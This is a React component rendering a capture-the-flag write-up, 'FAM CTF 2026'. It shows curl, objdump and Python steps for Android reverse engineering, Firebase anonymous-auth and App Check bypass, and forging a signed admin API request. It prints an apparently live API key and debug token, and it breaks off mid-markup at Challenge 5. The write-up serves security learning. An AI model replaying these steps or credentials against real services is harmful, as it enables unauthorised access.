import React, { useEffect } from 'react';
import { motion } from 'framer-motion';
import Navbar from './components/layout/Navbar';
import Footer from './components/layout/Footer';
import Cursor from './components/layout/Cursor';

// ── Image paths ──
const IMG = '/fam ctf writeup imgs';
const img = {
  score: `${IMG}/score.png`,
  scoreOverTime: `${IMG}/Score over Time.png`,
  // Challenge 1
  c1_question: `${IMG}/challenge 1/question1.png`,
  c1_1: `${IMG}/challenge 1/1.png`,
  c1_2: `${IMG}/challenge 1/2.png`,
  c1_3: `${IMG}/challenge 1/3.png`,
  c1_4: `${IMG}/challenge 1/4.png`,
  c1_5: `${IMG}/challenge 1/5.png`,
  // Challenge 2
  c2_question: `${IMG}/challenge 2/question2.png`,
  c2_1: `${IMG}/challenge 2/1.png`,
  c2_11: `${IMG}/challenge 2/1.1.png`,
  c2_12: `${IMG}/challenge 2/1.2.png`,
  c2_2: `${IMG}/challenge 2/2.png`,
  // Challenge 3
  c3_question: `${IMG}/challenge 3/question3.png`,
  c3_1: `${IMG}/challenge 3/1.png`,
  c3_2: `${IMG}/challenge 3/2.png`,
  c3_3: `${IMG}/challenge 3/3.png`,
  c3_4: `${IMG}/challenge 3/4.png`,
  // Challenge 4
  c4_question: `${IMG}/challenge 4/question4.png`,
  c4_1: `${IMG}/challenge 4/1.png`,
  c4_2: `${IMG}/challenge 4/2.png`,
  c4_3: `${IMG}/challenge 4/3.png`,
  c4_4: `${IMG}/challenge 4/4.png`,
  c4_5: `${IMG}/challenge 4/5.png`,
  c4_6: `${IMG}/challenge 4/6.png`,
  c4_7: `${IMG}/challenge 4/7.png`,
  // Challenge 5
  c5_question: `${IMG}/challenge 5/question5.png`,
  c5_1: `${IMG}/challenge 5/1.png`,
  c5_2: `${IMG}/challenge 5/2.png`,
  c5_3: `${IMG}/challenge 5/3.png`,
  c5_4: `${IMG}/challenge 5/4.png`,
  c5_5: `${IMG}/challenge 5/5.png`,
  c5_6: `${IMG}/challenge 5/6.png`,
  // Challenge 6
  c6_question: `${IMG}/challenge 6/question6.png`,
  c6_1: `${IMG}/challenge 6/1.png`,
  c6_2: `${IMG}/challenge 6/2.png`,
};

// ── Reusable components ──

function Tag({ children }: { children: string }) {
  return (
    <span style={{
      fontFamily: 'var(--font-mono)',
      fontSize: '0.62rem',
      letterSpacing: '0.1em',
      textTransform: 'uppercase',
      color: 'var(--accent)',
      border: '1px solid var(--border-subtle)',
      padding: '4px 10px',
      lineHeight: 1,
    }}>
      #{children}
    </span>
  );
}

function Screenshot({ src, alt, caption }: { src: string; alt: string; caption?: string }) {
  return (
    <figure style={{ margin: '32px 0' }}>
      <img
        src={src}
        alt={alt}
        loading="lazy"
        style={{
          width: '100%',
          maxWidth: '100%',
          height: 'auto',
          border: '1px solid var(--border-subtle)',
          display: 'block',
        }}
      />
      {caption && (
        <figcaption style={{
          fontFamily: 'var(--font-mono)',
          fontSize: '0.7rem',
          color: 'var(--accent)',
          marginTop: 10,
          letterSpacing: '0.04em',
          lineHeight: 1.5,
        }}>
          {caption}
        </figcaption>
      )}
    </figure>
  );
}

function CodeBlock({ children }: { children: string }) {
  return (
    <pre style={{
      background: '#2E2E2E',
      color: '#ECE6D8',
      padding: '20px 24px',
      fontFamily: 'var(--font-mono)',
      fontSize: '0.82rem',
      lineHeight: 1.7,
      overflowX: 'auto',
      margin: '20px 0',
      border: '1px solid rgba(200,194,180,0.2)',
      whiteSpace: 'pre',
      wordBreak: 'keep-all',
    }}>
      <code>{children}</code>
    </pre>
  );
}

function InlineCode({ children }: { children: string }) {
  return (
    <code style={{
      fontFamily: 'var(--font-mono)',
      fontSize: '0.85em',
      background: 'rgba(46,46,46,0.08)',
      padding: '2px 6px',
      border: '1px solid var(--border-subtle)',
      color: 'var(--text-primary)',
    }}>
      {children}
    </code>
  );
}

function FlagBox({ flag }: { flag: string }) {
  return (
    <div style={{
      background: 'rgba(139,125,107,0.08)',
      border: '1px solid var(--accent)',
      padding: '20px 24px',
      margin: '24px 0',
      fontFamily: 'var(--font-mono)',
      fontSize: '0.9rem',
      color: 'var(--text-primary)',
      letterSpacing: '0.02em',
      lineHeight: 1.6,
      overflowX: 'auto',
      whiteSpace: 'pre',
    }}>
      🚩 {flag}
    </div>
  );
}

function Note({ children }: { children: React.ReactNode }) {
  return (
    <div style={{
      borderLeft: '2px solid var(--accent)',
      paddingLeft: 20,
      margin: '20px 0',
      fontStyle: 'italic',
      color: 'var(--text-primary)',
      opacity: 0.8,
      fontSize: '0.92rem',
      lineHeight: 1.7,
    }}>
      {children}
    </div>
  );
}

function ChallengeHeader({ number, title, category, points }: {
  number: number;
  title: string;
  category: string;
  points: number;
}) {
  return (
    <div style={{
      borderTop: '1px solid var(--border-subtle)',
      paddingTop: 64,
      marginTop: 80,
      marginBottom: 40,
    }}>
      <p className="label-mono" style={{ marginBottom: 12 }}>
        CHALLENGE {number}
      </p>
      <h2 style={{
        fontFamily: 'var(--font-display)',
        fontWeight: 700,
        fontSize: 'clamp(1.8rem, 4vw, 2.8rem)',
        letterSpacing: '-0.02em',
        textTransform: 'uppercase',
        color: 'var(--text-primary)',
        lineHeight: 1.05,
        marginBottom: 16,
      }}>
        {title}
      </h2>
      <div style={{ display: 'flex', gap: 24, flexWrap: 'wrap' }}>
        <span className="label-mono" style={{ fontSize: '0.7rem' }}>
          Category: {category}
        </span>
        <span className="label-mono" style={{ fontSize: '0.7rem' }}>
          Points: {points}
        </span>
      </div>
    </div>
  );
}

function SectionHeading({ children }: { children: string }) {
  return (
    <h3 style={{
      fontFamily: 'var(--font-display)',
      fontWeight: 700,
      fontSize: 'clamp(1rem, 1.6vw, 1.2rem)',
      letterSpacing: '-0.01em',
      textTransform: 'uppercase',
      color: 'var(--text-primary)',
      marginTop: 40,
      marginBottom: 16,
      lineHeight: 1.3,
    }}>
      {children}
    </h3>
  );
}

function Paragraph({ children }: { children: React.ReactNode }) {
  return (
    <p style={{
      fontFamily: 'var(--font-body)',
      fontSize: '1.05rem',
      lineHeight: 1.8,
      color: 'var(--text-primary)',
      fontWeight: 400,
      marginBottom: 16,
    }}>
      {children}
    </p>
  );
}

function Takeaway({ children }: { children: React.ReactNode }) {
  return (
    <div style={{
      background: 'rgba(139,125,107,0.05)',
      borderLeft: '3px solid var(--accent)',
      padding: '20px 24px',
      margin: '32px 0',
    }}>
      <p className="label-mono" style={{ fontSize: '0.6rem', marginBottom: 8 }}>KEY TAKEAWAY</p>
      <p style={{
        fontFamily: 'var(--font-body)',
        fontSize: '1rem',
        lineHeight: 1.75,
        color: 'var(--text-primary)',
        fontWeight: 400,
      }}>
        {children}
      </p>
    </div>
  );
}


// ── Main Article ──

export default function FamCtfArticle() {
  useEffect(() => {
    document.documentElement.classList.add('lenis');
    window.scrollTo(0, 0);
  }, []);

  const tags = ['CTF', 'ANDROID', 'REVERSE ENGINEERING', 'FIREBASE', 'WEB SECURITY', 'CLOUD SECURITY'];

  return (
    <>
      <Cursor />
      <div className="paper-texture" />
      <div className="grid-bg" />
      <Navbar />

      <motion.main
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.6, ease: [0.25, 0.1, 0.25, 1] }}
        style={{
          minHeight: '100vh',
          paddingTop: 140,
          paddingBottom: 80,
          position: 'relative',
          zIndex: 1,
        }}
      >
        <article className="container-main" style={{ maxWidth: 820, margin: '0 auto' }}>

          {/* ── Back link ── */}
          <a
            href="/writeups.html"
            data-cursor-hover
            style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: 8,
              fontFamily: 'var(--font-mono)',
              fontSize: '0.72rem',
              letterSpacing: '0.1em',
              textTransform: 'uppercase',
              color: 'var(--accent)',
              textDecoration: 'none',
              marginBottom: 48,
              transition: 'color 0.2s ease',
              cursor: 'none',
            }}
            onMouseEnter={(e) => (e.currentTarget.style.color = 'var(--text-primary)')}
            onMouseLeave={(e) => (e.currentTarget.style.color = 'var(--accent)')}
          >
            ← Back to Writeups
          </a>

          {/* ── Article Header ── */}
          <header style={{ marginBottom: 64 }}>
            <p className="label-mono" style={{ marginBottom: 16 }}>CTF WRITEUP</p>
            <h1 style={{
              fontFamily: 'var(--font-display)',
              fontWeight: 700,
              fontSize: 'clamp(2.2rem, 5.5vw, 3.5rem)',
              letterSpacing: '-0.03em',
              textTransform: 'uppercase',
              color: 'var(--text-primary)',
              lineHeight: 1,
              marginBottom: 20,
            }}>
              FAM CTF 2026
            </h1>
            <p style={{
              fontFamily: 'var(--font-body)',
              fontSize: '1.1rem',
              color: 'var(--text-primary)',
              marginBottom: 8,
              fontWeight: 500,
            }}>
              Aroh Maurya
            </p>
            <p className="label-mono" style={{ marginBottom: 24, fontSize: '0.68rem' }}>
              8 JULY 2026 · 25 MIN READ
            </p>
            <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
              {tags.map((t) => <Tag key={t}>{t}</Tag>)}
            </div>
          </header>

          {/* ── Final Scoreboard ── */}
          <div style={{
            borderTop: '1px solid var(--border-subtle)',
            paddingTop: 48,
          }}>
            <SectionHeading>Final Scoreboard</SectionHeading>
            <Paragraph>
              All six challenges were solved. The final standing was <strong>1850 points</strong>, with a <strong>100 percent solve rate</strong> and <strong>zero failed attempts</strong>.
            </Paragraph>
            <Screenshot src={img.score} alt="Final scoreboard showing 1850 points and all six solves" caption="Final scoreboard showing 1850 points and all six solves" />
            <Screenshot src={img.scoreOverTime} alt="Cumulative score over time, climbing from 100 to 1850 points" caption="Cumulative score over time, climbing from 100 to 1850 points" />
          </div>

          {/* ── Methodology ── */}
          <SectionHeading>Penetrating Methodology</SectionHeading>
          <Paragraph>The following is the high-level path taken across all six challenges. Each item is expanded in full detail further down.</Paragraph>
          <div style={{ margin: '16px 0 32px 0' }}>
            {[
              ['Challenge 1 — The Library', 'Decompile the Android app, discover a native function, unpack the APK, and read a hardcoded flag out of a native library using strings.'],
              ['Challenge 2 — The Database', 'Notice the app signs in anonymously to Firebase, reproduce that anonymous sign-in, and read a protected database node with the resulting token.'],
              ['Challenge 3 — The Vault', 'Reverse engineer a native function to recover a Firebase App Check debug token, exchange it for a valid App Check token, and read a protected Firestore document.'],
              ['Challenge 4 — The Endpoint', 'Reverse engineer a custom native request-signing algorithm, rebuild it in Python, sign an admin request, and call a protected API.'],
              ['Challenge 5 — The Vault Door', 'Attack a web application\'s JSON Web Token by forging an unsigned token to escalate from a normal user to an administrator.'],
              ['Challenge 6 — The Cloud', 'Chain a Server-Side Request Forgery weakness with the cloud instance metadata service to steal temporary AWS credentials and read a protected file from an S3 bucket.'],
            ].map(([title, desc], i) => (
              <div key={i} style={{
                display: 'grid',
                gridTemplateColumns: '24px 1fr',
                gap: 12,
                marginBottom: 16,
                alignItems: 'baseline',
              }}>
                <span className="label-mono" style={{ fontSize: '0.65rem' }}>{i + 1}.</span>
                <p style={{
                  fontFamily: 'var(--font-body)',
                  fontSize: '0.95rem',
                  lineHeight: 1.7,
                  color: 'var(--text-primary)',
                }}>
                  <strong>{title}:</strong> {desc}
                </p>
              </div>
            ))}
          </div>


          {/* ═══════════════════════════════════════════
              CHALLENGE 1 — THE LIBRARY
              ═══════════════════════════════════════════ */}
          <ChallengeHeader number={1} title="The Library" category="Static Analysis (Android)" points={100} />

          <SectionHeading>The idea behind the challenge</SectionHeading>
          <Paragraph>
            The challenge gave me a single file: an Android application named <InlineCode>fam-ctf.apk</InlineCode>. The goal of a static analysis challenge is to inspect an application without running it. I read its code and its bundled files to find a secret that the developers left inside.
          </Paragraph>
          <Note>
            <strong>Beginner note:</strong> an APK is simply the installer package for an Android app. Under the hood it is just a ZIP archive that contains the compiled program code, images, and native libraries. Because developers sometimes hide secrets inside the app believing users will never look, static analysis is often enough to find them.
          </Note>

          <SectionHeading>Step 1: Decompile the app with JADX</SectionHeading>
          <Paragraph>
            Compiled Android apps are not human readable on their own. JADX is a tool that converts the compiled code back into readable Java-like source code so I can study it.
          </Paragraph>
          <CodeBlock>{`~/jadx-tool/bin/jadx -d ~/fam_output ~/fam-ctf.apk`}</CodeBlock>
          <Paragraph>
            The command produced a small number of errors, which is normal for decompilation, but the output was complete enough to read. This gave me a folder of readable source code to search through.
          </Paragraph>

          <SectionHeading>Step 2: Find the app's own code and the suspicious function</SectionHeading>
          <Paragraph>
            Decompiled apps contain a lot of library code that is not interesting. I narrowed my attention to the application's own package, <InlineCode>com/ctf</InlineCode>, and inspected <InlineCode>MainActivity.java</InlineCode>. Searching the code for the keyword <InlineCode>native</InlineCode> revealed a very interesting declaration.
          </Paragraph>
          <CodeBlock>{`grep -rn "native" ~/fam_output/sources/com/ctf/`}</CodeBlock>
          <Paragraph>The search found this line:</Paragraph>
          <CodeBlock>{`public native String getSecretFromNative();`}</CodeBlock>
          <Note>
            <strong>Beginner note:</strong> the word <InlineCode>native</InlineCode> means this function is not written in Java. It is implemented in low-level C or C++ code that is compiled into a separate <InlineCode>.so</InlineCode> library file bundled inside the APK. Whenever a secret is described as coming from native code, the next place to look is those <InlineCode>.so</InlineCode> library files.
          </Note>
          <Paragraph>This told me the secret lives inside a native library, not in the Java code.</Paragraph>
          <Screenshot src={img.c1_1} alt="Decompiling fam-ctf.apk with JADX into a readable source tree" caption="Decompiling fam-ctf.apk with JADX into a readable source tree" />
          <Screenshot src={img.c1_2} alt="The MainActivity source showing the native getSecretFromNative declaration" caption="The MainActivity source showing the native getSecretFromNative declaration" />

          <SectionHeading>Step 3: Unpack the APK as a ZIP archive</SectionHeading>
          <Paragraph>Because an APK is a ZIP file, I can simply extract it to get at the native libraries.</Paragraph>
          <CodeBlock>{`unzip fam-ctf.apk -d fam_apk_extracted`}</CodeBlock>
          <Paragraph>
            Inside the extracted files, the native libraries live under a <InlineCode>lib/</InlineCode> folder, organised by processor architecture. I found the relevant library at: <InlineCode>lib/x86_64/libfam.so</InlineCode>
          </Paragraph>
          <Paragraph>I now had the exact native library that the app loads.</Paragraph>
          <Screenshot src={img.c1_3} alt="Extracting the APK and locating lib/x86_64/libfam.so" caption="Extracting the APK and locating lib/x86_64/libfam.so" />

          <SectionHeading>Step 4: Pull readable text out of the native library</SectionHeading>
          <Paragraph>
            The <InlineCode>strings</InlineCode> command scans any binary file and prints out sequences of readable characters. Developers often leave secrets as plain text inside compiled libraries, and <InlineCode>strings</InlineCode> is the fastest way to find them. I piped the output into <InlineCode>grep</InlineCode> to only show lines that look like a flag or a secret.
          </Paragraph>
          <CodeBlock>{`strings ./lib/x86_64/libfam.so | grep -iE "flag|secret|FAM"`}</CodeBlock>
          <Paragraph>The output revealed the flag in plain text, along with some other hardcoded values that would become useful in later challenges (an API key and a server URL).</Paragraph>
          <Screenshot src={img.c1_4} alt="Running strings on libfam.so and revealing the hardcoded flag" caption="Running strings on libfam.so and revealing the hardcoded flag" />

          <Paragraph>The extra values I noted for later were:</Paragraph>
          <CodeBlock>{`API key: AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww
Server URL: http://172.16.13.107:9000`}</CodeBlock>
          <Screenshot src={img.c1_5} alt="The recovered flag and additional hardcoded values such as the API key and server URL" caption="The recovered flag and additional hardcoded values such as the API key and server URL" />

          <FlagBox flag="FAM{str1ngs_d0nt_l13_1n_n4t1v3_l4nd}" />

          <Takeaway>
            Secrets stored inside an app, even in native libraries, are not truly hidden. Anyone can unpack the app and read them. Sensitive values should never be shipped inside client applications. The challenge name and flag both make the same point: strings do not lie in native land.
          </Takeaway>


          {/* ═══════════════════════════════════════════
              CHALLENGE 2 — THE DATABASE
              ═══════════════════════════════════════════ */}
          <ChallengeHeader number={2} title="The Database" category="Firebase / Authentication" points={200} />

          <SectionHeading>The idea behind the challenge</SectionHeading>
          <Paragraph>
            The description hinted: the door is open to anyone, and identity is optional here. This is a strong clue that the app uses anonymous authentication, where the server hands out a valid login token to anyone who asks, without a username or password.
          </Paragraph>
          <Note>
            <strong>Beginner note:</strong> Firebase is a Google platform that gives apps a ready-made backend, including a real-time database and user authentication. A common mistake is to protect data so that only logged-in users can read it, while also allowing anyone to log in anonymously. That combination protects nothing.
          </Note>

          <SectionHeading>Step 1: Understand what the app does</SectionHeading>
          <Paragraph>
            Studying the decompiled code from Challenge 1, I found the function that verifies this flag. It first calls Firebase anonymous sign-in, then reads a node named <InlineCode>flag</InlineCode> from a Firebase Realtime Database.
          </Paragraph>
          <CodeBlock>{`signInAnonymously()
// then reads the "flag" reference from:
// https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app`}</CodeBlock>

          <SectionHeading>Step 2: Confirm the data is protected without a token</SectionHeading>
          <Paragraph>I first tried to read the flag node directly, with no authentication, to confirm it was actually protected.</Paragraph>
          <CodeBlock>{`curl "https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app/flag.json"`}</CodeBlock>
          <Paragraph>The server responded with:</Paragraph>
          <CodeBlock>{`{"error": "Permission denied"}`}</CodeBlock>
          <Paragraph>This proved the data was locked to unauthenticated users, so I needed a token.</Paragraph>
          <Screenshot src={img.c2_1} alt="Unauthenticated request to the flag node returning Permission denied" caption="Unauthenticated request to the flag node returning Permission denied" />

          <SectionHeading>Step 3: Get an anonymous token, exactly like the app does</SectionHeading>
          <Paragraph>
            Using the API key recovered in Challenge 1, I called Google's Identity Toolkit to sign up anonymously and receive a fresh identity token. This is the same request the app makes silently in the background.
          </Paragraph>
          <CodeBlock>{`curl -X POST \\
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww" \\
  -H "Content-Type: application/json" \\
  -d '{"returnSecureToken":true}'`}</CodeBlock>
          <Paragraph>
            The response contained an <InlineCode>idToken</InlineCode> (an 826-character string). I stored it in a shell variable named <InlineCode>TOKEN</InlineCode>.
          </Paragraph>
          <Screenshot src={img.c2_11} alt="Requesting an anonymous idToken from the Firebase Identity Toolkit" caption="Requesting an anonymous idToken from the Firebase Identity Toolkit" />

          <SectionHeading>Step 4: Read the flag using the token</SectionHeading>
          <Paragraph>With a valid token in hand, I repeated the read of the flag node, this time attaching the token with the <InlineCode>auth</InlineCode> parameter.</Paragraph>
          <CodeBlock>{`curl "https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app/flag.json?auth=$TOKEN"`}</CodeBlock>
          <Paragraph>The server now returned the flag.</Paragraph>
          <Screenshot src={img.c2_12} alt="Authenticated request returning the Challenge 2 flag" caption="Authenticated request returning the Challenge 2 flag" />
          <Screenshot src={img.c2_2} alt="Full terminal view of the successful anonymous authentication and flag retrieval" caption="Full terminal view of the successful anonymous authentication and flag retrieval" />

          <FlagBox flag="FAM{4n0n_4uth_1s_n0t_s3cur3_en0ugh}" />

          <Takeaway>
            Requiring a user to be logged in is meaningless if anyone can log in anonymously. Access rules must be based on who the user actually is and what they are allowed to see, not merely on whether a token exists.
          </Takeaway>


          {/* ═══════════════════════════════════════════
              CHALLENGE 3 — THE VAULT
              ═══════════════════════════════════════════ */}
          <ChallengeHeader number={3} title="The Vault" category="Firebase App Check / Native Reverse Engineering" points={300} />

          <SectionHeading>The idea behind the challenge</SectionHeading>
          <Paragraph>
            The description said the vault trusts no one it has not met, and the token is hiding in plain sight. This challenge adds a second layer of protection called Firebase App Check, which tries to ensure that only the genuine app (not a random script) can talk to the backend.
          </Paragraph>
          <Note>
            <strong>Beginner note:</strong> App Check works by making the app prove it is authentic before the backend answers. During development, apps use a special debug token to pass this check. If that debug token can be recovered, an attacker can pretend to be the real app. This flag lives in Cloud Firestore, a different Firebase database, in the collection <InlineCode>flags</InlineCode>, document <InlineCode>flag3</InlineCode>, field <InlineCode>value</InlineCode>.
          </Note>

          <SectionHeading>Step 1: Find where the debug token comes from</SectionHeading>
          <Paragraph>
            The verification function reads the flag from Firestore, but only after App Check succeeds. The App Check debug token is produced by a native function called <InlineCode>getDebugToken()</InlineCode>. Unlike Challenge 1, this token was not sitting in plain text inside <InlineCode>strings</InlineCode> output, meaning it was being computed at runtime.
          </Paragraph>

          <SectionHeading>Step 2: Disassemble the native function</SectionHeading>
          <Paragraph>
            I used <InlineCode>objdump</InlineCode> to disassemble the native library and read the machine instructions of the <InlineCode>getDebugToken</InlineCode> function.
          </Paragraph>
          <CodeBlock>{`objdump -d libfam.so | grep -A 200 "getDebugToken"`}</CodeBlock>
          <Paragraph>
            Reading the assembly, I discovered the token is not stored directly. Instead it is built by taking a block of encoded bytes and running them through two XOR operations (one against the constant <InlineCode>0xAA</InlineCode>, and one against a 19-byte key), looping over 36 bytes.
          </Paragraph>
          <Note>
            <strong>Beginner note:</strong> XOR is a reversible scrambling operation. If you know the scrambled data and the key, you can XOR them together again to recover the original. This is exactly what I did.
          </Note>
          <Screenshot src={img.c3_1} alt="Disassembling the getDebugToken native function with objdump" caption="Disassembling the getDebugToken native function with objdump" />

          <SectionHeading>Step 3: Recover the debug token in Python</SectionHeading>
          <Paragraph>
            I copied the key bytes and the encoded bytes out of the disassembly and reproduced the same XOR logic in Python to unscramble the token.
          </Paragraph>
          <CodeBlock>{`key_data = bytes.fromhex("ecebe7f5d999c9d899def5c199d3f5989a989c")
encoded = bytes.fromhex(
    "7e077a69460654361e356c5e72546b7005031b7f"
    "75096b5e775336754d672f04401d0705"
)
out = bytes(
    encoded[i] ^ (key_data[i % 19] ^ 0xAA)
    for i in range(36)
)
print(out.decode())`}</CodeBlock>
          <Paragraph>This produced the App Check debug token:</Paragraph>
          <CodeBlock>{`8F76557D-A35A-4B51-94D4-D0DF98D79B55`}</CodeBlock>
          <Screenshot src={img.c3_2} alt="Python XOR reconstruction printing the recovered debug token" caption="Python XOR reconstruction printing the recovered debug token" />

          <SectionHeading>Step 4: Exchange the debug token for a real App Check token</SectionHeading>
          <Paragraph>
            A debug token is not the final key; it must be exchanged with Firebase for a short-lived App Check token. I used the app's project number (<InlineCode>674578159678</InlineCode>) and app ID (<InlineCode>1:674578159678:android:775058d15777caf841996f</InlineCode>) to make that exchange.
          </Paragraph>
          <CodeBlock>{`curl -X POST \\
  "https://firebaseappcheck.googleapis.com/v1/projects/674578159678/apps/1:674578159678:android:775058d15777caf841996f:exchangeDebugToken?key=AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww" \\
  -H "Content-Type: application/json" \\
  -d '{"debug_token":"8F76557D-A35A-4B51-94D4-D0DF98D79B55"}'`}</CodeBlock>
          <Paragraph>
            The response contained a 933-character App Check token, which I stored in a variable named <InlineCode>APP_CHECK_TOKEN</InlineCode>.
          </Paragraph>
          <Screenshot src={img.c3_3} alt="Exchanging the debug token for a valid App Check token" caption="Exchanging the debug token for a valid App Check token" />

          <SectionHeading>Step 5: Read the protected Firestore document</SectionHeading>
          <Paragraph>
            Finally, I called the Firestore REST API for the <InlineCode>flag3</InlineCode> document, passing the App Check token in the special <InlineCode>X-Firebase-AppCheck</InlineCode> header.
          </Paragraph>
          <CodeBlock>{`curl "https://firestore.googleapis.com/v1/projects/fam-ctf/databases/(default)/documents/flags/flag3" \\
  -H "X-Firebase-AppCheck: $APP_CHECK_TOKEN"`}</CodeBlock>
          <Paragraph>The document was returned, and its <InlineCode>value</InlineCode> field contained the flag.</Paragraph>
          <Screenshot src={img.c3_4} alt="Reading the protected Firestore flag3 document using the App Check token" caption="Reading the protected Firestore flag3 document using the App Check token" />

          <FlagBox flag="FAM{4pp_ch3ck_byp4ss_g00d_j0b}" />

          <Takeaway>
            App Check raises the bar, but it is not a substitute for real server-side authorization. Debug tokens are especially dangerous because, once recovered from the app, they let an attacker impersonate the genuine client.
          </Takeaway>


          {/* ═══════════════════════════════════════════
              CHALLENGE 4 — THE ENDPOINT
              ═══════════════════════════════════════════ */}
          <ChallengeHeader number={4} title="The Endpoint" category="Native Reverse Engineering / API Request Signing" points={400} />

          <SectionHeading>The idea behind the challenge</SectionHeading>
          <Paragraph>
            This challenge protects an API endpoint with a custom request signature. Every request to <InlineCode>/api/check</InlineCode> must include a header called <InlineCode>X-Signature</InlineCode>, whose value is computed by a secret algorithm inside the native library. To call the endpoint as the admin, I had to reverse engineer that algorithm and reproduce it exactly.
          </Paragraph>
          <Note>
            <strong>Beginner note:</strong> a request signature is a fingerprint of a request. The server recomputes the fingerprint on its side and only accepts the request if the fingerprints match. If the signing algorithm is hidden in the client, reverse engineering can rebuild it.
          </Note>

          <SectionHeading>Step 1: Find the starting point</SectionHeading>
          <Paragraph>
            Rather than reading the whole library at once, I started from what happens when the challenge button is pressed. The <InlineCode>submitChallenge()</InlineCode> method builds the request body <InlineCode>{`{"username":"admin"}`}</InlineCode> and calls <InlineCode>{`computeSignature("POST", "/api/check", body)`}</InlineCode>. That made <InlineCode>computeSignature</InlineCode> the clear target.
          </Paragraph>
          <Screenshot src={img.c4_1} alt="Locating submitChallenge and the computeSignature call in the decompiled code" caption="Locating submitChallenge and the computeSignature call in the decompiled code" />

          <SectionHeading>Step 2: Disassemble computeSignature</SectionHeading>
          <Paragraph>I disassembled the native <InlineCode>computeSignature</InlineCode> function and studied its structure piece by piece.</Paragraph>
          <CodeBlock>{`objdump -d libfam.so | grep -A 400 "computeSignature"`}</CodeBlock>
          <Screenshot src={img.c4_2} alt="Disassembling the native computeSignature function" caption="Disassembling the native computeSignature function" />
          <Screenshot src={img.c4_3} alt="Identifying the constants, states, and hashing building blocks in the assembly" caption="Identifying the constants, states, and hashing building blocks in the assembly" />

          <Paragraph>The algorithm combined a canonical request string with several well-known building blocks:</Paragraph>
          <ul style={{ paddingLeft: 24, marginBottom: 20, fontFamily: 'var(--font-body)', fontSize: '1.02rem', lineHeight: 2 }}>
            <li>A canonical string built as <InlineCode>{`POST|/api/check|{"username":"admin"}`}</InlineCode>.</li>
            <li>The same 19-byte XOR key seen in Challenge 3, applied per input byte.</li>
            <li>Four 64-bit internal state values used as starting seeds.</li>
            <li>The fmix64 finalizer from MurmurHash3 (using constants <InlineCode>0xff51afd7ed558ccd</InlineCode> and <InlineCode>0xc4ceb9fe1a85ec53</InlineCode>).</li>
            <li>An FNV-1a hash (offset <InlineCode>0xcbf29ce484222325</InlineCode>, prime <InlineCode>0x100000001b3</InlineCode>).</li>
            <li>A final mixing step and an output formatted as four 64-bit values in hexadecimal, giving a 64-character signature.</li>
          </ul>

          <SectionHeading>Step 3: Rebuild the algorithm in Python</SectionHeading>
          <Paragraph>I translated everything into a Python script that computes the signature for the admin request body.</Paragraph>
          <Screenshot src={img.c4_4} alt="First Python reconstruction of the signing algorithm" caption="First Python reconstruction of the signing algorithm" />

          <SectionHeading>Step 4: First attempt fails</SectionHeading>
          <Paragraph>Sending the first computed signature returned an error, which is a normal part of reverse engineering. The failure was useful evidence that one small detail was wrong.</Paragraph>
          <CodeBlock>{`curl -i -X POST "https://ctf.fampay.co/api/check" \\
  -H "Content-Type: application/json" \\
  -H "X-Signature: 2c64c639cabe5382ccd9fe4681277a84a05b00ea3d4d1443f685681298952188" \\
  -d '{"username":"admin"}'`}</CodeBlock>
          <Paragraph>The server replied:</Paragraph>
          <CodeBlock>{`HTTP/2 401
{"error": "X-Signature verification failed"}`}</CodeBlock>
          <Screenshot src={img.c4_5} alt="The first signature attempt failing with HTTP 401" caption="The first signature attempt failing with HTTP 401" />

          <SectionHeading>Step 5: Find and fix the mistake</SectionHeading>
          <Paragraph>
            Going back to the assembly, I compared exactly which byte each operation consumed. Each input byte is transformed as:
          </Paragraph>
          <CodeBlock>{`key_byte = KEY_DATA[i % 19] XOR 0xAA
mixed_byte = input_byte XOR key_byte`}</CodeBlock>
          <Paragraph>
            The internal states correctly used <InlineCode>mixed_byte</InlineCode>, but my FNV-1a step had mistakenly used the original <InlineCode>input_byte</InlineCode>. The native code actually feeds the transformed <InlineCode>mixed_byte</InlineCode> into FNV-1a as well.
          </Paragraph>
          <CodeBlock>{`# incorrect
fnv ^= byte

# correct
fnv ^= mixed_byte`}</CodeBlock>
          <Paragraph>This one-line change completely changed the final signature, a reminder that in a custom algorithm the exact input to every operation matters.</Paragraph>
          <Screenshot src={img.c4_6} alt="Correcting the FNV-1a step to use the transformed byte" caption="Correcting the FNV-1a step to use the transformed byte" />
          <Paragraph>The corrected script produced:</Paragraph>
          <CodeBlock>{`Canonical string: POST|/api/check|{"username":"admin"}
Final signature: 2c64c639cabe5382ccd9fe4681277a847ef6be05f7b3aefdf685681298952188`}</CodeBlock>

          <SectionHeading>Step 6: Send the correctly signed request</SectionHeading>
          <CodeBlock>{`curl -i -X POST "https://ctf.fampay.co/api/check" \\
  -H "Content-Type: application/json" \\
  -H "X-Signature: 2c64c639cabe5382ccd9fe4681277a847ef6be05f7b3aefdf685681298952188" \\
  -d '{"username":"admin"}'`}</CodeBlock>
          <Paragraph>This time the server accepted it:</Paragraph>
          <CodeBlock>{`HTTP/2 200
{"flag": "FAM{x_s1gn4tur3_r3v3rs3d_n1c3ly}", "message": "Welcome, admin."}`}</CodeBlock>
          <Screenshot src={img.c4_7} alt="The corrected signed request returning HTTP 200 and the flag" caption="The corrected signed request returning HTTP 200 and the flag" />

          <FlagBox flag="FAM{x_s1gn4tur3_r3v3rs3d_n1c3ly}" />

          <Takeaway>
            A signing algorithm hidden inside the client is not a secret. With patience it can be rebuilt exactly. Real request integrity has to rely on a secret that stays on the server, never shipped inside the app.
          </Takeaway>


          {/* ═══════════════════════════════════════════
              CHALLENGE 5 — THE VAULT DOOR
              ═══════════════════════════════════════════ */}
          <ChallengeHeader number={5} title="The Vault Door" category="Web Application Security / JWT Authentication Bypass / Privilege Escalation" points={350} />

          <SectionHeading>The idea behind the challenge</SectionHeading>
          <Paragraph>
            The challenge presented NexaVault, an internal credential portal. Anyone could create a normal account, but only administrators could open the Vault. The hint was: not all secrets are meant to be strong. The goal was to escalate a normal account into an administrator account.
          </Paragraph>
          <Note>
